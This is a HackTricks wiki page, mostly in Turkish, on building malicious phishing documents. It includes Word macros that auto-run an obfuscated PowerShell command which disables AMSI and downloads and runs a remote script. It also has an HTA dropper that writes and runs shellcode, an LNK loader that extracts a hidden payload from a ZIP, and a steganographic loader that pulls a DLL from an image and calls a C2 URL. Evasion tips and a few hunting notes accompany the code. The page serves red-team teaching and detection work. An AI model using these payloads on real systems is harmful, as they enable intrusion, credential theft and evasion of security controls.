# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word bir dosyayı açmadan önce dosya verisi doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına göre veri yapılarını tanımlama şeklinde gerçekleştirilir. Veri yapı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.

Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneğini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, fakat DOCM olarak yeniden adlandırılmış bir dosya RTF olduğunda Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite'in (Excel, PowerPoint etc.) tüm yazılımları için geçerlidir.

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Harici Resim Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Kategoriler**: Links and References, **Field names**: includePicture, and **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Makro Arka Kapısı

Makrolar kullanılarak belgede herhangi bir kod çalıştırmak mümkündür.

#### Otomatik yükleme fonksiyonları

Ne kadar yaygınlarsa, AV tarafından tespit edilme olasılığı o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Makro Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verilerini elle kaldır

Git **File > Info > Inspect Document > Inspect Document**'e; bu, Document Inspector'ı açar. **Inspect**'e tıklayın ve sonra **Document Properties and Personal Information** yanındaki **Remove All**'e tıklayın.

#### Doc Uzantısı

İşiniz bittiğinde **Save as type** açılır menüsünü seçin, formatı **`.docx`**'ten **Word 97-2003 `.doc`**'e değiştirin.\
Bunu yapın çünkü **`.docx`** içinde macro'ları kaydedemezsiniz ve macro-enabled **`.docm`** uzantısı etrafında bir olumsuz algı (ör. küçük resim simgesinde büyük bir `!` olur ve bazı web/e-posta geçitleri bunları tamamen engeller) vardır. Bu nedenle bu **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

HTA, HTML ve scripting dillerini (ör. VBScript ve JScript) birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcı güvenlik modelinin kısıtlamaları olmadan "tam güvenilir" bir uygulama olarak çalışır.

HTA, genellikle **Internet Explorer** ile birlikte **yüklü** olan **`mshta.exe`** kullanılarak çalıştırılır; bu da **`mshta`'nın IE'ye bağımlı** olduğu anlamına gelir. Bu nedenle IE kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlama

NTLM kimlik doğrulamasını **"uzaktan" zorlamak** için birkaç yol vardır; örneğin kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana sadece klasörü açmakla bir **kimlik doğrulamasını tetikleyecek** **dosyaların adresini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Hash'i veya kimlik doğrulamayı çalmanın yanı sıra, aynı zamanda **NTLM relay attacks** gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Son derece etkili kampanyalar, içinde iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk bulunan bir ZIP gönderir. Hile şudur: gerçek PowerShell loader, ZIP'in ham baytlarında benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte tamamen çıkartıp çalıştırır.

Tipik akış, .lnk PowerShell one-liner tarafından uygulanır:

1) Orijinal ZIP'i şu yaygın yollarda bul: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
2) ZIP baytlarını oku ve sabit kodlanmış bir işaretçi (ör. xFIQCV) bul. İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData% içine kopyala, orada çıkar ve meşru görünmek için yem .docx'i aç.
4) Mevcut işlem için AMSI'yi atla: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki aşamayı deobfuscate et (ör. tüm # karakterlerini kaldır) ve bellekte çalıştır.

Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Teslimat genellikle itibarlı PaaS alt alan adlarını kötüye kullanır (ör. *.herokuapp.com) ve payload'ları gate edebilir (IP/UA'ya göre zararsız ZIPs sunabilir).
- Bir sonraki aşama sıkça base64/XOR shellcode'u çözer ve Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır; böylece disk üzerindeki artefaktları en aza indirir.

Aynı zincirde kullanılan persistence
- COM TypeLib hijacking of the Microsoft Web Browser control öyle ayarlanır ki IE/Explorer veya onu embed eden herhangi bir uygulama payload'u otomatik olarak yeniden başlatsın. Ayrıntılar ve hazır komutlar için bakınız:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verilerine eklenmiş ASCII marker string'i (ör. xFIQCV) içeren ZIP files.
- ZIP'i bulmak için üst/kullanıcı klasörlerini listeleyen ve bir decoy document açan .lnk.
- AMSI üzerinde [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla yapılan tampering.
- Güvenilir PaaS domainleri altında barındırılan linklerle sonlanan uzun süre çalışan business thread'leri.

## Steganography-delimited payloads in images (PowerShell stager)

Son loader zincirleri obfusk edilmiş bir JavaScript/VBS teslim eder; bu dropper gömülü Base64'i çözüp bir Base64 PowerShell stager'ı çalıştırır. O stager, genellikle GIF olan bir görüntü indirir; görüntü, benzersiz start/end marker'ları arasına düz metin olarak gizlenmiş Base64-encoded .NET DLL içerir. Script bu delimiters'ları arar (sahada görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64'ü byte'lara decode eder, assembly'i belleğe yükler ve C2 URL ile bilinen bir giriş metodunu çağırır.

İş akışı
- Aşama 1: Archived JS/VBS dropper → gömülü Base64'i çözer → PowerShell stager'ı -nop -w hidden -ep bypass ile başlatır.
- Aşama 2: PowerShell stager → görüntüyü indirir, marker ile ayrılmış Base64'i ayıklar, .NET DLL'i belleğe yükler ve metodu (ör. VAI) C2 URL ve seçeneklerle çağırır.
- Aşama 3: Loader son payload'u alır ve tipik olarak process hollowing ile güvenilir bir binary'ye (çoğunlukla MSBuild.exe) enjekte eder. process hollowing ve trusted utility proxy execution hakkında daha fazlası için bakınız:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Görüntüden bir DLL carve edip .NET metodunu bellekte çağırmak için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- This is ATT&CK T1027.003 (steganography/marker-hiding). Marker'lar kampanyalara göre değişir.
- AMSI/ETW bypass ve string deobfuscation genellikle assembly yüklemeden önce uygulanır.
- Hunting: bilinen ayırıcılar için indirilen görüntüleri tara; görüntülere erişen PowerShell'i ve hemen Base64 blob'larını çözen işlemleri tespit et.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Tekrarlayan bir ilk aşama, arşiv içinde teslim edilen küçük, ağır şekilde obfuskasyon uygulanmış bir `.js` veya `.vbs` dosyasıdır. Tek amacı gömülü bir Base64 dizisini decode etmek ve `-nop -w hidden -ep bypass` ile PowerShell'i başlatarak HTTPS üzerinden bir sonraki aşamayı bootstrap etmektir.

Skeleton logic (abstract):
- Kendi dosya içeriğini oku
- Gereksiz diziler arasındaki bir Base64 blob'u bul
- ASCII PowerShell komutlarına dönüştür
- `wscript.exe`/`cscript.exe` ile `powershell.exe`'i çalıştırarak yürüt

Hunting cues
- Arşivlenmiş JS/VBS ekleri, komut satırında `-enc`/`FromBase64String` ile `powershell.exe` başlatıyor.
- `wscript.exe` kullanıcının temp yollarından `powershell.exe -nop -w hidden` başlatıyor.

## Windows files to steal NTLM hashes

NTLM kimlik bilgilerini çalmak için yerlerle ilgili sayfaya bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
